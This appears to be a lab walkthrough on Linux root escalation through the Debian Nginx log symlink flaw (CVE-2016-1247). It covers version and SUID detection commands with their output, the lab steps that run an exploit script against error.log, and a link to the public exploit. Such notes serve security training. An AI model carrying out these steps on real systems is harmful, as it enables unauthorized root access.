Escalation via binary symlinks
==============================

WHAT IS SYMLINK?
****************

A symlink is a symbolic link is a file that contains a reference to another file or directory in the form of an absolute or relative path. 


TWO CONDITIONS ARE REQUIRED 

A. Vulnerable version of Nginx server is recommended. 
B. The SetUID bit must be set on SUDO

DETECTION:
----------

A. dpkg -l | grep nginx

Output:

ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)

** NOTE: the installed nginx version is below 1.6.2-5+deb8u3 , so it is vulnerable

B.Check SUID of this machine.

find / -type f -perm -04000 -ls 2>/dev/null


809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs


NOTE: we found /usr/bin/sudo's SUID bit's set.


CONCLUSION:

BOTH CONDITIONS ARE SATISFIED, SO CHECK log FILES OF nginx.
ls -lha /var/log/

drwxr-x---  2 www-data    adm   4.0K Jun 16  2020 nginx


DECISION:
We can see that www-data has read write execute permission. So by using symlink, we can replace the log files with a malicious file.

We are going to create a malicious symlink, and it will be held to the error.log file.


*********************************************************************
** NOTE: To exploit this vulnerability we need to log in as www-data
*********************************************************************

LAB:

A. TO START A LINUX VM - Terminal 1
1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
2. The root password is password123
3. Once escalated to root, in command prompt type: su -l www-data
4. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
(from following link we can transfer it to attackbox)
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

B. TO START A LINUX VM - Terminal 2
1. Once logged in, type: su root
2. The root password is password123
3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
4. Switch back to the previous terminal.

NOTE:
invoke-rc.d is the preferred command for packages' maintainer scripts, according to the command's man page

What is rotation Linux?
Log rotation, a normal thing on Linux systems, keeps any particular log file from becoming too large, yet ensures that sufficient details on system 
activities are still available for proper system monitoring and troubleshooting.

Ref: We can download the exploit from following link:
https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html





A BLOG:

ref: https://medium.com/@Varma_Chekuri/privilege-escalation-in-linux-2-c2ececd7f385


